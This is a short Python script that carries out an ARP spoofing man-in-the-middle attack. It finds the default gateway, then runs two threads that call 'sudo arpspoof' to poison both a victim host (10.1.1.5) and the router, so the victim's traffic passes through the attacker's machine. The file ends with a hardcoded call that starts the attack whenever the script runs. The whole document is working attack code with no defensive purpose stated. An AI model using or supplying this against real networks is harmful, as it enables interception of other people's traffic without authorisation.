import subprocess
import threading


def perform_arp_spoof(victim_ip, iface="eth0"):
    # Get the router's IP address
    router_ip = subprocess.check_output(
        ["ip", "route"], encoding="utf-8").split("default via ")[1].split()[0]
    
    victim_thread = threading.Thread(target=run_arpspoof, args=(victim_ip, router_ip, iface, True))
    router_thread = threading.Thread(target=run_arpspoof, args=(victim_ip, router_ip, iface, False))

    victim_thread.start()
    router_thread.start()

    victim_thread.join()
    router_thread.join()


def run_arpspoof(victim_ip, router_ip, iface="eth0", target_victim=True):
    """
    Sends unsolicited ARP replies to either the victim or the router.
    """
    try:
        if target_victim:
            # Step 1: Send ARP reply to the victim (spoofing the router)
            subprocess.run(["sudo", "arpspoof", "-i", iface, "-t", victim_ip, router_ip], check=True)
            print(f"[*] Sent ARP reply to victim {victim_ip} (pretending to be {router_ip}).")
        else:
            # Step 2: Send ARP reply to the router (spoofing the victim)
            subprocess.run(["sudo", "arpspoof", "-i", iface, "-t", router_ip, victim_ip], check=True)
            print(f"[*] Sent ARP reply to router {router_ip} (pretending to be {victim_ip}).")

    except subprocess.CalledProcessError as e:
        print(f"[!] Failed to execute arpspoof: {e}")


# Example usage
victim_ip = "10.1.1.5"  # Victim's IP
iface = "eth0"  # Network interface

perform_arp_spoof(victim_ip, iface)
